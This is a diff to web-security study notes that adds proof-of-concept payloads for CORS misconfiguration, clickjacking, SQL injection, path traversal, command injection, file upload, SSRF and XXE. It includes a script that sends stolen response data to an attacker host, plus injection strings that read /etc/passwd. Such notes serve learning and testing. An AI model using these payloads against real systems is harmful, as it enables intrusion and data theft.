@@ -38,40 +38,168 @@
   as retrieving user setting information or saved payment card data.
   
       Example:
- ```html
-    Access-Control-Allow-Headers 
-    Access-Control-Max-Age 
-    Access-Control-Request-Headers 
-    Access-Control-Request-Method 
-    Origin 
-```
-1.4 Clickjacking: Clickjacking is an attack that tricks a user into clicking a webpage element which is invisible or disguised as another element. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online.
+      Vulnerable implementation;
+                  GET /endpoint HTTP/1.1
+                  Host: victim.example.com
+                  Origin: https://evil.com
+                  Cookie: sessionid=... 
+
+                  HTTP/1.1 200 OK
+                  Access-Control-Allow-Origin: https://evil.com
+                  Access-Control-Allow-Credentials: true 
+
+                  {"[private API key]"}
+                  
+     PoC
+                  var req = new XMLHttpRequest(); 
+                  req.onload = reqListener; 
+                  req.open('get','https://victim.example.com/endpoint',true); 
+                  req.withCredentials = true;
+                  req.send();
+
+                  function reqListener() {
+                      location='//atttacker.net/log?key='+this.responseText; 
+                  };
+
+1.4 Clickjacking: Clickjacking is an attack that tricks a user into clicking a webpage element which is invisible or disguised as another element. 
+  This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, 
+  or purchase products online.
+        
+        Example: PoC
+        
+                <style>
+                 iframe {
+                     position:relative;
+                     width: 500px;
+                     height: 700px;
+                     opacity: 0.1;
+                     z-index: 2;
+                 }
+                 div {
+                     position:absolute;
+                     top:470px;
+                     left:60px;
+                     z-index: 1;
+                 }
+                </style>
+            <div>Click me</div>
+            <iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
 
                                                     2-SERVER-SIDE ATTACKS
 
-2.1 SQL Injection: SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed. This information may include sensitive company data, user lists or customer card details.
+2.1 SQL Injection: SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access 
+  information that was not intended to be displayed. This information may include sensitive company data, user lists or customer card details.
 
 Types:
 i-In-band SQLi (Classic)
 ii-Inferential SQLi (Blind) 
 iii-Out-of-band SQLi
 
-2.2 Authentication: This type of attack targets and attempts to exploit the authentication process a web site uses to verify the identity of a user, service, or application Example; brute-forcing a login page.
+    Example: PoC
+              '
+              ''
+              `
+              ``
+              ,
+              "
+              ""
+              /
+              //
+              \
+              \\
+              ;
+              ' or "
+              -- or # 
+              ' OR '1
+              ' OR 1 -- -
+              " OR "" = "
+              " OR 1 = 1 -- -
+              ' OR '' = '
+              '='
+              'LIKE'
+              '=0--+
+               OR 1=1
 
-2.3 Directory Traversal: This attack exploits insufficient security validation or sanitization of user-supplied file names, such that characters representing "traverse to parent directory" are passed through to the operating system's file system API. An affected application can be exploited to gain unauthorized access to the file system. Example; ../../../../etc/passwd
+2.2 Authentication: This type of attack targets and attempts to exploit the authentication process a web site uses to verify the identity of a user, 
+  service, or application Example; brute-forcing a login page.
 
-2.4 Command Injection: command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. Example of commands are; whoami, id
+2.3 Directory Traversal: This attack exploits insufficient security validation or sanitization of user-supplied file names, such that characters 
+  representing "traverse to parent directory" are passed through to the operating system's file system API. An affected application can be exploited 
+  to gain unauthorized access to the file system. 
+      Example: PoC
+      ../../../../etc/passwd
+      . = %c0%2e, %e0%40%ae, %c0ae
+      / = %c0%af, %e0%80%af, %c0%2f
+      \ = %c0%5c, %c0%80%5c
+      \\localhost\c$\windows\win.ini
 
-2.5 Business Logic Vulnerabilities:Business logic vulnerabilities are design and implementation flaws in software applications. They have a legitimate business function, but can also be exploited by malicious attackers to create unexpected behavior. These flaws often result from an application’s inability to identify and safely handle unexpected user actions.
+2.4 Command Injection: command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary 
+  operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.
+    
+      Example of commands: 
+        Unix:
+          ;id;
+          ;id
+          ;netstat -a;
+          ;system('cat%20/etc/passwd')
+          ;id;
+          |id
+          |/usr/bin/id
+          |id|
+          |/usr/bin/id|
+          ||/usr/bin/id|
+          |id;
+          ||/usr/bin/id;
+          
+       Win:
+          %0Aid
+          %0a id %0a
+          %0Aid%0A
+          %0a ping -i 30 127.0.0.1 %0a
+          %0A/usr/bin/id
+          %0A/usr/bin/id%0A
+          %2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+          %20{${phpinfo()}}
+          %20{${sleep(20)}}
+          %20{${sleep(3)}}
 
-2.6 Information Disclosure: Information disclosure is when a web application fails to properly protect confidential information, which causes revealing sensitive information or data of the users or anything related to users to any third party.
+2.5 Business Logic Vulnerabilities:Business logic vulnerabilities are design and implementation flaws in software applications. 
+  They have a legitimate business function, but can also be exploited by malicious attackers to create unexpected behavior. These flaws often result 
+  from an application’s inability to identify and safely handle unexpected user actions.
 
-2.7 Access Controls: Access control vulnerabilities occur when users are able to act outside of their intended permissions. This typically leads to unauthorized access, information disclosure, and modification or destruction of data.
+2.6 Information Disclosure: Information disclosure is when a web application fails to properly protect confidential information, 
+  which causes revealing sensitive information or data of the users or anything related to users to any third party.
 
-2.8 File Uploads: File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.
+2.7 Access Controls: Access control vulnerabilities occur when users are able to act outside of their intended permissions. 
+  This typically leads to unauthorized access, information disclosure, and modification or destruction of data.
 
-2.9 Server Side Request Forgey(SSRF): A Server-Side Request Forgery (SSRF) attack involves an attacker abusing server functionality to access or modify resources. The attacker targets an application that supports data imports from URLs or allows them to read data from URLs. URLs can be manipulated, either by replacing them with new ones or by tampering with URL path traversal.
-
-2.10 XXE Injection: XXE (XML External Entity Injection) is a common web-based security vulnerability that enables an attacker to interfere with the processing of XML data within a web application.XXE attacks can result in port scanning within the internal network, server-side request forgery (SSRF), data exfiltration, use of an organization’s servers to perform denial of service (DoS), and more. 
-
-2.11 Session Management:session management vulnerabilities, the attackers manually detect gaps in user validation and verification, then use automated tools to retrieve further information and gain deeper control of the application
+2.8 File Uploads: File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating 
+  things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function 
+  can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.
+  
+    Example:PoC
+        file.jpg.php
+        file.jpgx00.php
+        file.Phtml
+        
+2.9 Server Side Request Forgey(SSRF): A Server-Side Request Forgery (SSRF) attack involves an attacker abusing server functionality to access or 
+  modify resources. The attacker targets an application that supports data imports from URLs or allows them to read data from URLs. URLs can be 
+  manipulated, either by replacing them with new ones or by tampering with URL path traversal.
+  
+    Example:
+      http://127.0.0.1/%61dmin
+      http://127.0.0.1/%2561dmin
+      
+2.10 XXE Injection: XXE (XML External Entity Injection) is a common web-based security vulnerability that enables an attacker to interfere with the 
+  processing of XML data within a web application.XXE attacks can result in port scanning within the internal network, server-side request forgery (SSRF),
+  data exfiltration, use of an organization’s servers to perform denial of service (DoS), and more. 
+  
+      Example: PoC
+        <!--?xml version="1.0" ?-->
+        <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+         <userInfo>
+          <firstName>John</firstName>
+          <lastName>&example;</lastName>
+         </userInfo>
+2.11 Session Management:session management vulnerabilities, the attackers manually detect gaps in user validation and verification, 
+then use automated tools to retrieve further information and gain deeper control of the application.
